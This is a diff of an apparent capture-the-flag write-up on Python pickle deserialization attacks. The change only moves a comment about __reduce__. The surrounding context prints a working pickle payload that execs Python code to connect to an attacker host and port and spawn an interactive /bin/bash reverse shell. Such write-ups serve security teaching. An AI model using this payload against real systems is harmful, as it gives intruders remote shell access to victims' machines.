@@ -18,6 +18,7 @@ A Python function is a callable object. So, if the attacker defines a class like
 ```python
 class RCE:
     def __reduce__(self):
+        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in pickle format).
         return (function_name, (parameter_1,parameter_2,)) #if there is only 1 parameter: (parameter_1,)
 ```
 ## Exploring the challenge
@@ -56,7 +57,6 @@ host="IP_Address"   #or "Domain_Name"
 port="PORT"
 class RCE:
     def __reduce__(self):
-        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in pickle format).
         return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
 ```
 Variables <code>host</code> and <code>port</code> contain, respectively, the IP address (or domain name) and the port on which the attacker will listen for the spawned reverse shell. 
